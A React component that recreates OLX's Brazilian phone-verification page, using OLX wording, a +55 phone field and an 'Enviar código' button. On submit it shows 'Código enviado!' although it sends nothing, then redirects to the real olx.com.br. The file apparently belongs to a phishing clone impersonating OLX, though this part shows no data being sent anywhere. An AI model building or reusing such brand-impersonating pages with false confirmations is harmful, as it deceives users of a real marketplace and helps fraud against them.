import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Info, Lock } from 'lucide-react';
import { toast } from "sonner";
import br from "../../assets/br.png"

const VerifyCode = () => {
  const navigate = useNavigate();
  const [phoneNumber, setPhoneNumber] = useState("");

  useEffect(() => {
    // Focus on input when component mounts
    const input = document.getElementById("phone-input");
    input?.focus();
  }, []);

  const formatPhoneNumber = (value: string) => {
    // Remove all non-numeric characters
    const numbers = value.replace(/\D/g, "");

    // Apply formatting: (XX) XXXXX-XXXX
    if (numbers.length <= 2) {
      return numbers;
    } else if (numbers.length <= 7) {
      return `(${numbers.slice(0, 2)}) ${numbers.slice(2)}`;
    } else if (numbers.length <= 11) {
      return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7)}`;
    }
    return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7, 11)}`;
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    // Allow only numbers, spaces, parentheses, and dashes
    if (/^[\d\s()-]*$/.test(value)) {
      const formatted = formatPhoneNumber(value);
      setPhoneNumber(formatted);
    }
  };

  const isValidPhone = () => {
    const numbers = phoneNumber.replace(/\D/g, "");
    return numbers.length === 11; // Brazilian mobile: 11 digits
  };

  const handleSubmit = () => {
    if (!isValidPhone()) {
      toast.error("Por favor, insira um número de telefone válido");
      return;
    }
    toast.success("Código enviado!");
    setTimeout(() => {
    window.location.href = "https://olx.com.br";
    }, 1000);
  };

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">

      <div className="w-full max-w-2xl">
        {/* Header */}
        <div className="mb-8">
          <h1 className="text-3xl font-semibold text-gray-900">
            Verificação de telefone
          </h1>
        </div>

        {/* Main Card */}
        <div className="bg-white rounded-2xl shadow-sm border border-gray-200 p-8 md:p-12">
          <div className="space-y-8">
            {/* Description */}
            <p className="text-gray-700 text-base leading-relaxed">
              Enviaremos um código por SMS para verificar seu número. Em caso de telefone fixo, ligaremos.
            </p>

            {/* Phone Input */}
            <div className="flex items-center gap-3">
              <div className="flex items-center mr-2 px-4 py-3 bg-white border-2 border-gray-300 rounded-xl">
                <img src={br} alt="" className=" flex items-center " />
                <span className="text-gray-900 font-medium mr-4">+55</span>
              </div>
              <input
                id="phone-input"
                type="tel"
                value={phoneNumber}
                onChange={handlePhoneChange}
                placeholder="(99) 99999-9999"
                maxLength={15}
                className="flex-1 px-5 py-4 text-lg border-2 border-purple-500 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 transition-all max-w-52"
              />
            </div>

            {/* Info Messages */}
            <div className="space-y-4">
              <div className="flex gap-4 items-start bg-gray-50 rounded-xl p-4">
                <div className="w-10 h-10 rounded-full bg-gray-200 flex items-center justify-center flex-shrink-0">
                  <Info className="w-5 h-5 text-gray-600" />
                </div>
                <p className="text-gray-700 text-sm leading-relaxed pt-2">
                  O mesmo número de telefone não pode ser usado em mais de uma conta OLX.
                </p>
              </div>

              <div className="flex gap-4 items-start bg-gray-50 rounded-xl p-4">
                <div className="w-10 h-10 rounded-full bg-gray-200 flex items-center justify-center flex-shrink-0">
                  <Lock className="w-5 h-5 text-gray-600" />
                </div>
                <p className="text-gray-700 text-sm leading-relaxed pt-2">
                  Seu número não será exibido para outros usuários.
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Submit Button */}
        <div className="mt-8 flex justify-end">
          <button
            onClick={handleSubmit}
            disabled={!isValidPhone()}
            className={`px-8 py-4 text-white font-semibold rounded-xl transition-all shadow-sm ${isValidPhone()
                ? "bg-orange-500 hover:bg-orange-600 hover:shadow-md active:scale-95 cursor-pointer"
                : "bg-gray-300 cursor-not-allowed"
              }`}
          >
            Enviar código
          </button>
        </div>
      </div>
    </div>
  );
};

export default VerifyCode;
